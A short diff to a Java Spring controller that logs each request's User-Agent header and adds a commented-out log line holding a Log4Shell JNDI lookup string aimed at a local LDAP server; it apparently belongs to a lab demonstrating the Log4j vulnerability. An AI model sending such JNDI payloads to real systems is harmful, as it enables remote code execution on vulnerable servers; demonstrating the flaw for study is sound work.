@@ -17,6 +17,8 @@ public class HelloController {
     public String index(HttpServletRequest request) {
 
         log.info("An INFO Message {}", request.getHeader("User-Agent"));
+//        log.info("{}", "${jndi:ldap://127.0.0.1:8099/sample}");
+
 
         return "Howdy! Check out the Logs to see the output...";
     }
